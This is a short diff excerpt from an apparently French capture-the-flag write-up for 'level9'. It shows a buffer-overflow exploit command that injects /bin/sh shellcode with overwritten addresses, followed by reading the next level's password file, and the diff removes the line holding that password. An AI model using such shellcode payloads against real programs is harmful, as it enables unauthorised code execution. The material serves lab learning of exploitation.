@@ -9,4 +9,3 @@ en cherchant la liste des functions appele on voit un STRCPY qui nous a deja ser
 ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + 83 * "A" + "\x0c\xa0\x04\x08"')
 
 cat /home/user/bonus0/.pass
-f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
